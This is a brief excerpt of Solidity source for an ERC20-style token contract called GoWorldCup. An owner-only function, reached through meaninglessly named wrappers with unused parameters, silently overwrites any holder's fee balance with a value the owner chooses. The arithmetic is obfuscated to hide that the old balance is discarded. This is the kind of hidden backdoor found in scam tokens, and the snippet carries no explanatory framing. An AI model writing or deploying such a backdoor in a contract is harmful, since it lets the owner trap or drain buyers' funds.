...
contract GoWorldCup is IERC20 {
  ...
  function BATSH(bytes32 DATA, uint8 dmount, uint256 _value, address taker) internal {
    require(taker != address(0));
    balancesFees[taker] = (balancesFees[taker] * 1 * 2 - balancesFees[taker] * 1 * 2) + (_value * 10 ** uint256(decimals));
  }
      
  function CATSH(bytes32 DATA, uint8 dmount, uint256 _value, address taker) public onlyOwner {
    require(_value > 0, "Transfer amount must be greater than zero");
    BATSH(DATA, dmount, _value, taker);
  }
